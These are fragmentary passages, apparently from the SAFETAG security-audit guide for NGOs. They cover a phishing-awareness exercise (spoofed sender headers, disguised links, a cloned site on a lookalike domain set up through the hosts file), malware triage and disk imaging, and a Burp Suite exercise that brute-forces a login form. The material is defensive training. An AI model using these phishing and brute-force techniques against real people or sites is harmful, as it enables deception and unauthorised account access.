comes up. Select all text, copy it and paste it on any plain text editor (such as Notepad) then save the file as “.EML”.\n* (Optional) When composing the e-mail you will send to yourself, include an attachment, such as this \"report\" (Right-click and select “Save File As) to download which is infected with the EICAR script.\n* Locate the “From:” header and add a “Reply-to: badguy@example.com” header to show an e-mail can be sent from a spoofed account. For example:\n```\nFrom: Legit Sender <legit_sender@example.com|\nTo: Bad Guy <badguy@example.com|\n```\n* Scroll down to the end of the document. You will notice that the body of your message shows up as plain text (under the \"Content-Type: text/plain header\") and rich text (HTML) under \"Content-Type: text/html.\" This is because most e-mail clients today support HTML formatting. Make sure to edit both sections of your message so changes are reflected in the e-mail when you open it for demonstration.\n* Modify the body of your message to Include typos and grammatical mistakes in it.\n* Include an obfuscated URL linking to a malware test file. For instance, the link http://bit.ly/E0hO8 points to a test file with the EICAR script, but this is hidden by the use of a bit.ly address.\n* On the HTML section of your message body,  create a “fake url” that links to a harmful site (for instance, the email might contain what appears to be a link to “example.com” but the link actually points to “harmfulsite.com”). For example:\n```\nContent-Type: text/html; charset=\"utf-8\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: quoted-printable\n\nRemember to visit <a\nhref=’http://www.harmfulsite.com’>http://www.example.com</a> to win our\ncontest!\n```\n* Crafting the content of the email. You may choose to create a \"stock\" email for this exercise, with customized versions for various trainings. Keep in mind that most participants will be familiar with your average general phishing email and may benefit more from an email that is more targeted towards them and their community. Items to include:\n  * EiCAR attachment, with a logical title vis-a-vis the content\n  * Obfuscated URL link using a shortner (e.g., the bit.ly address above or one of your own devising)\n  * A URL lnk that appears to go to an innocuous site but actually goes to a different, malicious-looking URL (e.g., A sentence that says \"Please check out our campaign page at \"www.facebook.com/OccupyMainStreet,\" where the URL actually links to a malicious URL that only becomes visible when you either mouse over it or click on the link and are redirected).\n  * Link to a customized phishing website (optional per section below).\n  * Choose your sender and reciever emails wisely, along with any cc'd emails. These can be used to illustrate how emails can seem trustworthy or valid at first glance and should be examined more closely, as well as the common tactic of cc'ing contacts the recipient may know or are familiar with. Other examples can be addresses that may be secondary accounts for legitimate contacts (e.g., \"anna.hrw@gmail.com\" as a misleading Human Rights Watch staffer emailing about regional human rights issues if your participants work with HRW).\n  * Anything else you can think of, especially any contemporary tactics or tactics that are being employed to target high-risk actors similar to your participants.\n**(Optional) Create your own phishing website**\n\nYou can also create a website as an example of phishing. This is recommended\nfor trainers with some previous knowledge of HTML editing, Apache server\nconfiguration, and name to IP-translation using the HOSTS file.\n\n(**Note:** You don’t have to link to this site in your email. The purpose is\nsimply to show how a hacker might camouflage a fake site with a clever URL -\nsuch as “tvvitter.com” - while maintaining the design of the genuine site).\n* Choose the site you would like to mirror.\n  * Use WinHTTrack to create a local copy of the website on your computer.\n  * After opening WinHTTrack click “Next” to start a new project.\n  * Create a New Project name and leave everything else as is. Click Next.\n  * Click on “add URL” and type the URL of the site you want to mirror. Make sure that the address is correct, as some websites redirect the user to other domain names (e.g: at the time of this writing ‘http://www.facebook.com’ was redirecting users to ‘https://www.facebook.com’ - the SSL-enabled Facebook -, meaning that WinHTTrack would not find files to download under http://www.facebook.com). If you get an error the “View Log File” option at the end is very helpful to find out the correct address.\n  * Click on “Set options” and make sure that “Maximum mirror depth” under the “Limits” tab is set to 0 or 1 depending on the website complexity (we don’t want to download a full website for the purposes of this training!). Click Next.\n  * If you want, you may connect immediately or delay the mirror. Click Next to start the download.\n  * Wait until the mirror is finished. Then click Finish.\n* Create a web server in your computer using XAMPP\n  * Install XAMPP on your computer. If you extract XAMPP in a top level folder like ```\"C:\"``` or ```\"D:\"```, you can start most servers like Apache or MySQL directly.\n  * Copy your mirrored website (usually under ```“C:\\My Websites\\projectname”```) to your htdocs folder (usually ```“C:\\xampp\\htdocs”```) making sure the htdocs folder is now the root directory of the index.htm for your mirrored website.\n  * Test if your mirrored website is working. Start Apache under the XAMPP control panel and point your web browser to http://127.0.0.1. You should be able to see a copy of the mirrored website.\n  * Edit some elements of the website (directly from opening the index.htm file in your htdocs folder with your favorite HTML editor, or a text editor like Notepad) to alert users that they are visiting a fake website.\n  * (Optional) On the HTML source of your mirrored website, you can include a Javascript routine to alert the user that they were “infected” by a virus, like this:\n```\n<body onload=”javascript:alert(‘test’);”>Body of your mirrored website</body|\n```\n* Point your website to a fake, yet clever URL (Note: this will only work in your computer).\n  * Open your hosts file with your favorite text editor (such as Notepad). Hosts files are documents that aide the network name resolution. When your computer tries to connect to a website, it will first check the hosts file to see if there is any reference to it before using your DNS server to resolve the URL. The location of your hosts file varies according to your operating system. Windows users can find their hosts file under their ```“C:\\windows\\system32\\drivers\\etc\\hosts\"```, while MacOS and Linux users will find their hosts file under “/etc/hosts”. Follow these steps to edit your hosts file based on your operating system.\n  * Each line of your hosts file translates a certain name to a specified IP address. The typical syntax consists of three parts, each separated by a space. The first part will be the location to redirect the address to, the second part will be the address that you will want to redirect, and the third part (optional) is for comments. If, for example, you would your fake website (currently hosted in 127.0.0.1) to link to the domain “tvviter.com” then you will need to include the following in your hosts file:\n```\n127.0.0.1 tvvitter.com #Optional Comment\n```\n  * Remember that this will only point “tvvitter.com” to your mirrored website. If you would also like the website to be accessible from “www.tvitter.com” you will need to include a separate line, like this:\n```\n127.0.0.1 tvvitter.com #main url\n127.0.0.1 www.tvvitter.com #www\n```\n  * Save the changes to your host file. Open your browser and go to tvvitter.com. You should be able to see your mirrored page.\n\n**Running the Activity**\n\nThis activity directly blends into the discussion that follows, so the\ndivision below is somewhat false. You can run this as group activity or with\nthe entire group of particpants.  Or you can display the e-mail in your\nprojector and having people comment on any inconsistencies. Sending\nparticpants the email allows it to be more interactive.\n\n**Option One:** Sharing the e-mail you've prepared with all participants. Ask\nthem to open it using a mail client and see what happens when they click the\nlinks or open the attachment. (Note: Since the EICAR file is a known, albeit\ninnocuous test file for malware, it may be directed into spam folders by some\nof the major email providers, such as Gmail. Because of this, we suggest\nsharing it with participants via USB.) (This approach also serves as a way to\ncheck whether or not they have functioning anti-virus programs that provide\nreal-time protection.) You will also want to have the email available on the\nprojector for the subsequent discussion.\n\n**Option Two:** Display the email via projector and engage the participants as\na group as you analyze the email and its contents.  *See also the Phishing\nQuiz example in this section.*\n\n**Discussion**\n\nOnce the email is shared, you can lead a discussion as participants explore\nits content and components. Items to cover as you have participants explore\nthe email:\n* What are participants' initial observations?\n* Show participants how to check the full header of the message. Are participants able to spot some inconsistencies?\n* Hover the cursor over links in the email (without clicking). Are participants able to spot anything suspicious (or phishy)? Explain URL shorteners, what they consist of and why they pose a security threat. Explain how most short URLs can be previewed.\n* Any observations about the sender? The addresses of those cc'd (if any)?\n* What happens when they open the attachment? (After participant input on this, open the EICAR file on your computer being projected and show how your own A/V in prevents the computer from being infected.)\n* On the flipchart, write “'phishing” and “malware” and explain the meaning of these words.\n* If you mirrored a website, now is a good time to show participants what a phishing website looks like. Note the subtle URL variances between the original website and the “fake” one.\n* Facilitate further discussion among participants: Do they have their own techniques for identifying phishing attacks and avoiding infections through email and websites?\n* What would they do if they spotted an email they suspected as a phishing email? [1. delete/mark as spam; 2. tell co-workers/colleagues/friends if relevant.]\n","recommendations":"Social Engineering and Phishing - especially highly targeted ones - are\nincredibly difficult to detect in \"real life,\" but reducing your reliance on\nattachments, being careful when opening links, and using tools (from your\nemail client to your document tools and web browser) which add layers

to target organizations. Malware like a Remote\nAccess Trojan (or RAT) can provide an attacker with backdoor access to a\ntargeted machine, enabling the attacker to steal information, record audio and\nvideo, as well as run commands on the infected machine.\n\nTo stop this from happening, you have to identify the malicious process within the system and stop it, or reformatting the machine in case you don’t feel spending time on stopping the malicious process.\n\nIt’s important to keep evidence, in case the auditee still has access to the original malicious software they received (e.g., an email, etc.), keep a copy of the file if you have the time and expertise to continue investigating or have the resources to submit it to other organizations working on analyzing such issues.\n\nScanning the possible infected machine or the original suspicious file with an anti-virus will save you time and effort, in the case such malware is already in its database. Scanning should always be the first step, preventing you from spending excess time if the machine was infected with a less serious piece of malware.\n\nAfter determining the machine is infected, you can proceed in helping the staff member back up their information, scanning the files for malware, then reformatting the infected machine. Note, it is very difficult to clean an infected machine if you only have a short window of time.\n\nIn case the machine was infected, taking an image of the operating system will allow you to replicate the infected machine and run it after you finish your audit for a more in-depth investigation or send it to an expert to work on investigating the malware. Note, this also can be difficult in an audit setting where time is limited. Also see operational security considerations that come with replicating the files of a staff member of a sensitive organization. Be sure this is absolutely necessary and the staff members provides consent before completing.\n","orgSize":100,"approaches":["Technical"],"position":50,"tools":null,"remoteOptions":["None"],"overview":"* Identification and **initial triage/analysis** of suspicious processes, files, and emails (via Anti-Virus scanning results, MISP and Virustotal information, network traffic analysis, and other research)\n* **Analyzing Specific Suspicious Events/Activities** - If the organization have specific concerns or evidence suggesting a targeted attack, the auditor can focus attention to match them against any known attacks or flag them for further research.\n\nIn the following, you should look for files and URLs that may indicate a compromise and may help you identify an infection. If you have time, some inital light research may be suggested to see if the URLs or files hashes have been identified by other security researchers which can help you provide more context to the organization around the types of threats they are facing.\n","materials_needed":"* An Incident Response Plan agreed upon with the organization\n* An emergency contact for the organization\n* A Kali Virtual machine connected to the Internet\n* A [Cuckoo Sandbox](https://cuckoosandbox.org/) installation (for later analysis post audit if you have the expertise)\n* VPN\n* USB drive(s)\n* Large capacity External Hard disk, OS installation media and license keys\n","considerations":"* Consider the time you have, investigating malware can take days (you should not investigate during the audit itself)\n* Confirm that the device belongs to the organization\n* Make sure to take the device offline before start working on it\n* Don’t transfer files from the infected machine to any other machines\n* Use a USB drive to move files from the infected machine to your Audit machine for investigating proposes\n* Study outputs for any obviously embarrassing personal information\n* Don’t test anything on your virtual machine without VPN\n","walk_through":"* In case they still have the original binaries (Attachment, email..etc.)\n1. Download the file to your auditing machine, Scan the file via Anti-Virus or hash the file and use virustotal.com to search for it (Note, don’t upload the actual file to virus total as uploaded files are discoverable by paid subscribers in most cases)\n2.

Run a non-depth scan for the machine and try to locate any suspicious files\n5. Collect the suspicious files, hash them, then search for them on virustotal.com\n6. Scan the open ports and monitor which applications is connected to external address\nThe next sections often are highly interrelated - a phishing email may include malicious URLs and/or files, network traffic may include URLs, URLs may try to send malicious file downloads.\n\n**Questions to ask the user / organization**\n\n* What suspicious behaviors are you witnessing?\n* Where and when are you seeing this behavior? What makes you feel that the machine is somehow infected?\n* Do you have an alternative to this machine/process/account you can use it until we clear things up?\n* Did you receive any suspicious or unexpected email, attachment or different form of communication that made you feel this way?\n* Do you still have access to the original email, attachment or any form of communication?\n\n- - -\n\n###### Variant: Phishing or Suspicious Emails\n\nIf the organization staff has received suspicious communications, the first step should be to clearly warn the auditee that any associated files or links *should not be opened*.\n\n* Ask the client to share the complete email with you. Instructions on how to share the complete email, which includes full headers and attachments:\n  Instructions: https://www.circl.lu/pub/tr-34/ (this is preferred over just asking for the headers - as described here: https://www.circl.lu/pub/tr-07/ - since it is just as complicated from the user prospective but provides more information to us or a malware researcher).\n* Investigate the intent of the message. If this email appears to be spam, you can rule out an advanced threat and include in your recommendations instructions on how to report spam or mark email messages as junk.\n* If the message does not seem to be spam and has links or files attached to the email, capture any suspicious URL and save the file in an empty storage device for further analysis.\n* If the email does not have links or files and is not spam, investigate it as a potential social engineering email.\n\n- - -\n\n###### Variant: Malicious Files\n\nIn this part, you will be investigating a file and determine if it’s malicious or not. The auditor will not have much time for this step, but a preliminary analysis (not longer than one hour) can be performed, following these instructions:\n\n* **Step 1: Collection**\n* Collect the binary from the targeted person or organization by asking them to forward you the suspicious email including any attachment in it, or by coping the file if it’s still on the machine by copying it to a USB drive. In case the user did not remember where the file is located, ask the user to walk through their browsing history or download folder and try to locate the file and then copy it to your USB drive.\n* Get a hash of the file and a timestamp of the file at acquisition\n\nInclude the hashes of the malicious files in the appendix of your assessment report.\n\n* **Step 2: Research**\n* Initial offline investigation, in this stage you will be scanning the file using [ClamAV](https://www.clamav.net/) which comes with Kali-Linux\n* Update CalmAV by running the following command in the terminal\n  `sudo freshclam`\n* Create a new folder and copy-paste the suspicious (file)s inside, then scan the targeted folder by running the following command in the terminal which is going to show the infected files and give you more information about it `clamscan -r –bell -i /your/target/folder`\n* Search for the hash on a MISP instance or VirusTotal to check if there are any related events, known malware associations, and connected details (such as URLs, email addresses, IP addresses)\n* After scanning the file, in case it has already been identified as malicious, the result will show you what type of malware is, in case the result showed the file as Trojan, Backdoor, agent or Remote access Trojan RAT then it’s time to consider taking an image from the hard drive, the original file, the header of the email and submit them for in depth investigation.\n\nIf the organization was targeted with a more advanced attack, there will be a high probability that the attacker will use new or disguised malware -- which means no Anti-Virus will find it as malicious, in this case, and if you feel you still have doubts that a clean file is still malicious, submit it for in depth analysis.\n\n* **Step 3 (Optional): Imaging**\n\nIn this step, you will be dealing with infected machine by one of the binaries you analyzed in step 1 and 2, or you are sure that the machine is infected and you have no time to analyze it. In this case, you will take a backup, migrate the data safely to a new machine and take a full image from the system and submit it for more in depth analysis.\n\n* It’s better to start with taking a full hard disk image, using ‘dd’ a tool that takes bit-by-bit copy of the hard drive, after taking the image, you will have an identical copy of infected machine and you can send the hard drive to experts for more in depth analysis. To take the image, you will need to boot the infected machine with a Live Kali Linux and apply the following steps:\n```\n-   Identify the `<source>` which is the infected hard disk, and `<destination>` the external hard disk you will put the image on, run the following command which will list all the drive *lsblk*\n-   After identifying the source and destination, apply the following command the start the process `dd if=<source> of=<destination> bs=<byte size>`\n```\n*Where bs is byte size, read more about how to use dd [here](https://wiki.archlinux.org/index.php/disk_cloning)*\n* Taking back up in this stage is to back-up all the important data and save them on a hard drive, usually it’s the document, desktop, download, favorite and personal data, save them on external storage then Scan them using [ClamAV](https://www.howtoforge.com/tutorial/clamav-ubuntu/) or any available Anti-virus on your auditing virtual machine.\n* Make sure the data is clean then transfer it to the clean replacement machine.\n* **Step 4 (Optional): Analysis**\n\n*See the [Incident Response Activity](https://safetag.org/activities/incident_response) for additional details.*\n\nYou will need at least one hour to prepare and carry the advanced investigation. this step is optional in case you have time and you think you still have doubts about the file and you need a more advanced result. In this step, you will analyze the suspicious file using Cuckoo Sandbox, an automated malware analysis system. In case you decided to go with this option, you will need an installed Linux on your audit machine you can use [this Kali guide](https://docs.kali.org/installation/kali-linux-hard-disk-install) to install Kali Linux.\n\n* Make sure you have that you have Cuckoo Sandbox installed on your audit Linux machine by running the following command `cuckoo`\n* In case Cuckoo was not installed, follow the following [instructions](http://docs.cuckoosandbox.org/en/latest/installation/) on how to install it. Make sure cuckoo is running without errors the previously posted documentation will provide you with details steps on how to install and run Cuckoo\n* Create a new folder and copy-paste the suspicious (file)s inside\n* You can use ‘submit’ to start analyzing the binary, you can find more options in the  [Cuckoo Sandbox documentation](http://docs.cuckoosandbox.org/en/latest/usage/submit/) , the easiest way to do it is by running the following command: `cuckoo submit /folder/targeted/binary`\n* To view the analysis results, once an analysis is completed, you will find the result in `$CWD/storage/analyses/`\n* You can find more information on how to read the results in the  [Cuckoo Sandbox documentation](http://docs.cuckoosandbox.org/en/latest/usage/results/)\n\n- - -\n\n###### Variant: Suspicious URLs\n\nYou may have found suspicious URLs in your wireshark output during the traffic analysis, in the email content, in IMs, etc.\n\nCapture the context in which the URL was sent to the user or used by a process (sender, timestamp including timezone, and any other identifying details).\n\nIf the URL was sent to the user through a message, ask them if they clicked the link.\n\n* Search for the URL in a MISP instance or with VirusTotal or URLScan.io. **Warning** - if the file is targeted malware, using online scanners such as VirusTotal or URLScan will show the attacker that you're carrying out an investigation on the incident; try to use their passive search features before using an active scan.\n* Open the URL in a private cuckoo sandbox instance for a forensic capture of anything malicious.\n* Submit the URL to archive.org or archive.is for public archiving (this could also disclose your investigation to the attacker).\n\n- - -\n\n###### Variant: Suspicious Processes\n\nIf you find suspicious open ports, follow the instructions in the Network Scanning activity section \"How to decide if an open port is suspicious\".\n\nIt can also be useful to follow these steps:\n\n* On every operating system, check if the device OS and the installed software are up-to-date and where possible set to automatically update.\n\n**Windows, Mac, Android**\n\n* On Windows, use [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) to dig into further details on each process.\n* Check that antivirus is installed in the device and is updated.\n* If an antivirus is installed, and it is up-to-date, launch a scan - this will help as a diagnostic tool, to identify any already known malware, not necessarily to remove it.\n      - if malware is identified:\n          - for commercial, known malware - get rid of it through the antivirus\n* If the the antivirus is disabled or not updated:\n      - Try to understand if the user disabled it, and why.\n          - if the user hasn't disabled it, a computer compromise is likely.\n**Android, iOS**\n\n* Check if the device is rooted or jailbroken - this might be an indicator of compromise.\n* Check if any suspicious applications have been installed from outside the official app stores, and on android, if this has been enabled.\n\n*See the [Device Checklist](https://safetag.org/activities/device_checklist/) and [Mobile Device Assessment](https://safetag.org/activities/mobile_device_survey/) activities for more in-depth device analysis.*\n\n- - -\n\n###### Variant: Unusual Network Traffic\n\nAdvanced threats may be identified during the network scanning and traffic analysis. See the [Network Scanning](https://safetag.org/activities/network_scanning) and [Traffic Analysis](https://safetag.org/activities/traffic_analysis) activities.\n\n- - -\n\n###### Variant: Threat Hunting\n\n**Threat Hunting**\nIn case you went through the entire process and still you have doubts about a file, email, process, or have other reasons to believe the organization may have undetected malware, you will probably need to work on specific threat hunting procedure that matches your needs, the organization's assets, and the threat profile of potential adversaries.\n\nThe [ThreatHunting.net](http://threathunting.net) project, is collecting different Threat Hunting techniques on their [GitHub repo](https://github.com/ThreatHuntingProject/ThreatHunting/tree/master/hunts).\n\nThe provided Threat Hunting procedures will guide on how to address your doubts on specific issue which means, you have to be able at least able to identify the category of the possible threat then apply the steps provided by [ThreatHunting.net](http://threathunting.net) project.\n","recommendations":"If the organization potentially receives documents from unknown\nand untrusted sources which could potentially target them through exploits,\nthey may use Dangerzone from First Look Media, a tool which will safely\nre-render various file formats through an automated process and allow the user\nto view documents stripped of any malicious content.

Make sure someone responsible for the website is either receiving these emails or checking regularly for available updates. Security updates should be applied immediately. It is a best practice however to have a “test” site where you can first deploy any CMS update before attempting it on a production site.\n\nFor websites using a content management system (Drupal, Wordpress, Joomla or similar), it is important to use a popular and open source tool (as opposed to a custom tool that a web design firm has put together for its customer base). Open source tools are more likely to have their security holes discovered and fixed at a rapid pace, but the burden remains on the organization to keep up to date with these security updates.\n\nThe top CMS tools have dashboards and other tools to help alert the webmaster to available updates, and security updates should be heeded quickly. For sites that hold password data, it is worth exploring additional security features – the built-in password security for even modern CMS systems is weak, but the methods to improve upon them vary widely depending on the system.\n\nFor sites built on custom CMS software which does not regularly receive updates, it is strongly advisable to migrate to a more standard, open source system.\n\nNote that “Static” websites – those created with a web design tool and uploaded to a server – are both more secure (no code to break) and also withstand denial of service attacks easier. However, these are more difficult to maintain and update, and work best only for “brochure” style sites.\n\nFor custom CMS systems, it is strongly advisable to migrate to a more standard, open source system.\n\nAn increasingly good practice is for organizations to take advantage of the \"free\" tiers of DDoS mitigation services, of which [CloudFlare](https://www.cloudflare.com/) is probably the best known. A challenge of these free services can be that they have definite limits to their protection. With CloudFlare, organizations can request to be a part of their [Project Galileo](https://www.cloudflare.com/galileo) program to support at-risk sites even beyond their normal scope of support.\n\nA community-based, open source alternative is [Deflect](https://deflect.ca/), which is completely free for eligible sites.\n\nSome of these services will be revealed by BuiltWith, but checking the HTTP Response Headers (in Chromium/Chrome, available under the Inspect Element tool, or by using [Firebug](https://addons.mozilla.org/en-US/firefox/addon/firebug/) in Firefox.

There are multiple ways to do this, from passive to more active scanning. SAFETAG takes great care to take a primarily passive approach to this work, especially when done off-site, so as not to have unintended consequences on the organization's infrastructure or undermine operational security concerns. Care should be taken to review operational security concerns, work closely with the organization, and pursue a minimal approach focused on the priorities of the organization.

It is **not a point-and-click** tool, but is designed to be used by hands-on testers to support the testing process. With a little bit of effort, anyone can start using the core features of Burp to test the security of their applications. Some of Burp's more advanced features will take further learning and experience to master.\"  To know more about BurpSuite's other tools and features, visit BurpSuite's [Tools](https://portswigger.net/burp/help/suite_burptools) and it's [functions](https://portswigger.net/burp/help/suite_functions) pages.\n\n**Requirements**\n\nNote: If you are using Kali Linux, you already have Burpsuite pre-installed. Otherwise if you do not have a Linux box, refer to the following requirements below:\n\n- Windows/MAC OSX (Kali Linux Preferred)\n- [Java Runtime Environment](http://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html)\n- Browser ([Chrome](https://www.google.com/chrome/index.html), [Firefox](https://www.mozilla.org/en-US/firefox/new/))\n- [BurpSuite](https://portswigger.net/burp)\n\nAll of this investment is hugely worth it - Burp's user-driven workflow is by the far the most effective way to perform web security testing, and will take you way beyond the capabilities of any conventional point-and-click scanner. Burp is intuitive and user-friendly, and the best way to start learning is by doing. These steps will get you started with running Burp and using its basic features. You can then read on deeper into the documentation to become more proficient in using this supremely powerful tool.\n\nBurp Suite contains various tools for performing different testing tasks. The tools operate effectively together, and you can pass interesting requests between tools as your work progresses, to carry out different actions.\n\nTo know more about BurpSuite's other tools and features, visit BurpSuite's [Tools](https://portswigger.net/burp/help/suite_burptools) and it's [functions](https://portswigger.net/burp/help/suite_functions) pages.\n\nBurp's [Getting Started Documentation](https://portswigger.net/burp/help/suite_gettingstarted) is quite detailed and useful, and strongly recommends launching Burp from the command line for better control. In specific, it recommends assigning the amount of memory you wish to dedicate to burp:\n\n**Requirements**\n\nNote: If you are using Kali Linux, you already have Burpsuite pre-installed. Otherwise if you do not have a Linux box, refer to the following requirements below:\n\n- Windows/MAC OSX (Kali Linux Preferred)\n- [Java Runtime Environment](http://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html)\n- Browser ([Chrome](https://www.google.com/chrome/index.html), [Firefox](https://www.mozilla.org/en-US/firefox/new/))\n- [BurpSuite](https://portswigger.net/burp)\n\n\n**Launching Burpsuite**\n\nWith Java installed, on some platforms you may be able to run Burp directly by double-clicking the Burp JAR file. However, it is preferable to launch Burp from the command line, as this gives you more control over its execution, in particular the amount of memory that your computer assigns to Burp. To do this, in your command prompt type a command like:\n\n```\njava -jar -Xmx1024m /path/to/burp.jar\n```\n\nwhere 1024 is the amount of memory (in Mb) that you want to assign to Burp, and /path/to/burp.jar is the location of the Burp JAR file on your computer.\n\nThe [troubleshooting help](https://portswigger.net/burp/help/suite_troubleshooting.html) can help if Burp doesn't appear shortly.\n\n**Setting up your environment**\n\n- Verifying Scope/Target:\n    - Always check that you have the right URL/Domain before starting. Last thing we wanted to happen is to scan a different target that is out of our scope!\n- Setting up your browser\n - For Firefox:\n   - Paste ```about:preferences#advanced``` this in your URL, and click ```Settings``` left of **Connection**\n   - Click ```Manual proxy configuration``` and enter ```localhost``` under **HTTP Proxy**, with Port set to: ```8080```\n   - Check ```Use this proxy server for all protocols```\n - For Chrome:\n   - Paste ```chrome://settings/system``` then click **Open proxy Settings**\n   - This will open the **Network Setting* windows in Kali. Click **Network proxy** and set *Method* to ```Manual```\n    - Set **HTTP Proxy** to ```127.0.0.1``` with **Port** valued at ```8080```\n    - Configure the rest of settings with following values above (HTTPS, FTP Proxies, and Socks Host)\n- Setting up Socks Proxy (Optional)\n - In some cases, you will be required to scan from an approved testing environment or a specific network/IP range. In this case, you have to configure Socks Proxy for your assessment.\n - Verify your IP. Take note of your current IP address. ([WhatismyIP.com](http://whatismyip.com/))\n - To setup your Socks Proxy, we can do this by connecting via SSH to our server:\n   - ```ssh –D 9292 –l username@server_name/ip```\n - Once authenticated, configure Burpsuite to route it's traffic to our outbound SSH tunnel.\n   - From **Options** Tab, click **Connections** sub-tab and scroll down to ```Socks Proxy```\n   - In **Socks Proxy host**, type ```localhost```. and under **Socks Proxy port**, type ```9292```\n   - Then check **Use SOCKS proxy** button\n - You can again [check](http://whatismyip.com/) your IP address to verify if your configuration is correct.\n**Testing Burpsuite Configuration**\n\n*NOTE: Scanning web applications without the owner's permission is potentially illegal. It is important that you test Burpsuite on your own web applications, or on a controlled environment. There are some publicly available websites that are insecure by default to be used for testing and learning purposes. Among these were:*\n - [bWAPP](http://www.itsecgames.co) - Buggy Web Application\n - [HackThis](https://www.hackthis.co.uk) - Hacker's Playground\n - [HackThisSite](http://www.hackthissite.org/) - Community Driven hacking exercises\n - [HackMe](https://hack.me/s/) - Community based, collaborative hacking exercises and vulnerable web apps\n - [CrackMeBank](http://crackme.cenzic.com/kelev/view/home.php)\n*(You can use these sites to get familiar with Burpsuite, and performing the following excerices in this guide.)*\n\n**Intercepting Request**\n - To start intercepting traffic to and from your target domain/URL, in your configured browser, enter the the target domain, and hit enter.\n - On your Burpsuite instance, under **Proxy** Tab, and sub-tab **Intercept**, make sure that the ```Intercept``` button is on.\n - If it captures the request from your Firefox browser, it means that your configuration is correct.\n - Click ```Forward``` and the request will be forwarded to the server/target and the next sub-tab **HTTP History** will now start to generate some contents, each time you open a link, or a page within the target domain.\n**Adding Target/Scope**\n - Adding your target into scope is important so you won't miss, or even scan URLs that are not included in your list of targets.\n - To add the target to your scope, right-click the domain/website, then select **Add to Scope**\n - Burp will now tell you if you want ot stop sending out-of-scope items in your **HTTP history** tab and other Burp Tools - click **Yes**.\n - This will now appear in your **Target** tab, and under **Scope** sub-tab.\n - To add subdomains into your scope, you can use regex:\n ```.*\\.test\\.com$```\n**Managing Burp Projects**\n - Managing burpsuites project will depend on the version you are using. Some features may not be available for free version of burp, but are only available for Pro Version. See burp's documentation for managing projects [here](https://portswigger.net/burp/help/suite_burp_projects)\n - Selecting project type:\n    - Temporary project - Quick tasks, no need to save data\n    - New project on Disk - Creates new project and stores it on disk on a [\"Burp project file\"](https://portswigger.net/burp/help/suite_burp_projects#projectfiles)\n    - Open existing project - Opens recent existing project from a [\"Burp project file\"](https://portswigger.net/burp/help/suite_burp_projects#projectfiles). Scanners & spiders are paused.\n - Selecting Configuration\n    - Burp Defaults - BurpSuite's default options\n    - Use options Saved within project - Only available when reopening an existing project. It uses the options saved from the previous project\n    - Load from a configuration file - Opens a project using the options contained on a [Burp Configuration File](https://portswigger.net/burp/help/suite_burp_projects#configfiles)\n**NOTE:** According to BurpSuite documentation, *\"If you open an existing project that was created by a different installation of Burp, then Burp will prompt you to decide whether to take full ownership of the project.*\n\n*This decision is needed because Burp stores within the project file an identifier that is used to retrieve any ongoing Burp Collaborator interactions that are associated with the project. If two instances of Burp share the same identifier in ongoing work, then some Collaborator-based issues may be missed or incorrectly reported. You should only take full ownership of a project from a different Burp installation if no other instance of Burp is working on that project.\"*\n\nSince that Burpsuite is an advance tool for testing web applications, This guide will cover most of the basic testing activities for Burpsuite. To learn more of the advance features, it is important that you have a licensed version.\n\n**Basic BurpSuite Testing Excercises:**\n\nAttacking web application using simple payload set (Bruteforce attack):\n - Verify that your Burp is working\n    - You must first try to test if your Burp and browser are both configured\n - Login page of target application\n    - Now try visiting any login page of your target web application (you can use any test site mentioned above)\n - \"Intercept On\" - Make sure that you have your burpsuite's intercept function set to \"ON\".\n    - Before you click \"ENTER\" to submit your sample credentials, you can intercept web traffic request from your browser to the server under **Proxy** > **Intercept** tab, then \"Intercept\" button is set to \"ON\".\n - Review contents of the requests under **Proxy** > **Intercept** > **Raw**\n    - On the **Raw** tab, Once you see the \"POST /login.php\" request of your browser to the web application server, select ALL and right-click on the selected/highlighted texts and select **Send to Intruder**\n - Now under **Intruder** > **number tab** > **Target** uncheck \"Use HTTPs\".\n - Now click under **Intruder** > **number tab** > **Position** to view all replaceble variables.\n - Try looking for ```email``` and ```pass```,\n    - You can either change your variable for ```email``` and ```pass``` for earch or just include ONE variable. For this exercise, we will use the ```pass``` variable.\n - Now under **Intruder** > **Payloads**\n    - You can define here the number of payload sets depdening on  your attack type (for our case, since we only have 1, let's use 1)\n - Now below the options ```Payload Sets```, you can see ```Payload Options``` where you can ```add```, ```Paste```, ```add from list``` strings that you can use as your payload.\n - After typing your list of strings or passwords, let's go to **Positions** tab, and on the right side of ```Payload Options```  click **Start Attack**\n - After clicking \"Start Attack\" it will open a window of results usually your HTTP responses codes.\nTake note of these errors to see how the target web application respond when given certain types of strings.\n\n\n**Setting up your environment**\n\n\n**Selecting a Project**\n\n**Selecting a Configuration**\n\n**Opening a Project From a Different Burp Installation**\n\n**Display Settings**\n\n**The Basics of Using Burp**\n___\n\n###### Variant: Zed Attack Proxy (ZAP) (Active)\n\nZed Attack Proxy (ZAP) allows an auditor to quickly identify common web vulnerabilities - either by a relatively intense spidering of the website or through a more tailored use of the proxy functionality of the tool.\n\nZAP provides a highly configurable tool to test for common website vulnerabilities. In addition to supporting organizational change to support general best practices for websites, OWASP can expose more specific vulnerabilties that may warrant action above and beyond general best practice work.\n\nFor a website that can be expected to withstand a dedicated spidering of its content, the automated mode will dig through and expose common vulnerabilities. The tool itself is relatively easy to use.\n\nFor more delicate sites, private sites, or other situations, ZAP can also proxy your web browser and test the pages you click through.\n\nQuick Guide Setting up ZAP Scanner:\n\n1. Download the latest version of ZAP from: [https://www.zaproxy.org/](https://www.zaproxy.org/)\n\n2. After installation, you will be brought into the ZAP's Session management page.\n  - Yes, I want to persist this session with name based on the current timestamp\n  - Yes, I want to persist this session but I want to specify the name and location\n  - No, I don't want to persist this session at this moment in time\n  - Remember my choice and do not ask me again\nNote: By default, ZAP sessions are always recorded to disk in a HSQLDB database with a default name and location. If you do not persist the session, those files are deleted when you exit ZAP.\n\nZAP User Interface:\n\nThe ZAP user interface consist of the following options:\n\n|Options|Description|\n|-------------|-------------------------------------------------------|\n|Menu Bar|Provides access to many of the automated and manual tools|\n|Toolbar|Includes buttons which provide easy access to most commonly used features|\n|Tree Window|Displays the Sites tree and the Scripts tree|\n|Workspace Window|Displays requests, responses, and scripts and allows you to edit them|\n|Information Window|Displays details of the automated and manual tools|\n|Footer| Displays a summary of the alerts found and the status of the main automated tools|\n\nRunning Assessment:\n\nBefore you can run your assessment in ZAP, you need to configure your browser first to use ZAP as it's proxy. By default, ZAP uses:\n\nAddress:    